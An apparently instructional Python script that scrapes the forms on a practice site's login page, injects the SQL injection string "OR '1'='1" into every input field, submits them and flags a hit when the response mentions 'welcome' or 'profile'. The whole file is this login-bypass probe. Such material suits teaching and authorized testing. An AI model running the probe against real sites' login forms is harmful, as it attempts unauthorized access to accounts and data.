# Import necessary libraries
import requests  # For making HTTP requests
from bs4 import BeautifulSoup as bs  # For parsing HTML content
from urllib.parse import urljoin  # For combining base URLs with form actions
from pprint import pprint  # For neatly printing detected form details

# Step 1: Create a session object and set a User-Agent to mimic a browser
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

# URL of the target website
url = "http://testphp.vulnweb.com/login.php"

# Fetch the page content
response = s.get(url)  # Send a GET request to the target URL
html_content = response.content  # Extract raw HTML content

# Parse the HTML content to extract forms
forms = bs(html_content, "html.parser").find_all("form")  # Find all forms on the page
print(f"[+] Detected {len(forms)} forms on {url}")  # Report the number of forms detected

# Define a common SQL Injection payload
payload = "OR '1'='1"  # A typical SQL Injection payload

# Step 2: Scan each form for potential vulnerabilities
for form in forms:
    # Extract form details (action and method)
    action = form.attrs.get("action", "").lower()  # Form submission target
    method = form.attrs.get("method", "get").lower()  # Form submission method (default: GET)

    # Extract all input fields in the form
    inputs = []
    for input_tag in form.find_all("input"):  # Iterate through each <input> field
        input_type = input_tag.attrs.get("type", "text")  # Default input type is "text"
        input_name = input_tag.attrs.get("name")  # Get the input field's name
        input_value = input_tag.attrs.get("value", "")  # Default value is an empty string
        inputs.append({"type": input_type, "name": input_name, "value": input_value})  # Save input field details

    # Create a dictionary to store form details
    form_details = {"action": action, "method": method, "inputs": inputs}

    # Prepare the data to be submitted
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] != "submit":  # Skip the submit button
            data[input_tag["name"]] = payload  # Inject the payload into all other fields

    # Combine the base URL with the form action
    target_url = urljoin(url, form_details["action"])

    # Send the form data based on the method (POST or GET)
    if form_details["method"] == "post":
        res = s.post(target_url, data=data)  # Send POST request
    elif form_details["method"] == "get":
        res = s.get(target_url, params=data)  # Send GET request

    # Check the server's response for signs of SQL Injection vulnerability
    if "welcome" in res.text.lower() or "profile" in res.text.lower():
        # Report if vulnerability is detected
        print(f"\n[+] Vulnerability Detected!")
        print(f"Target URL: {target_url}")
        print(f"Payload Used: {payload}")
        print(f"Form Details:")
        pprint(form_details)
        break  # Stop after detecting the first vulnerability
    else:
        print(f"[-] No vulnerability detected on form targeting {target_url}")

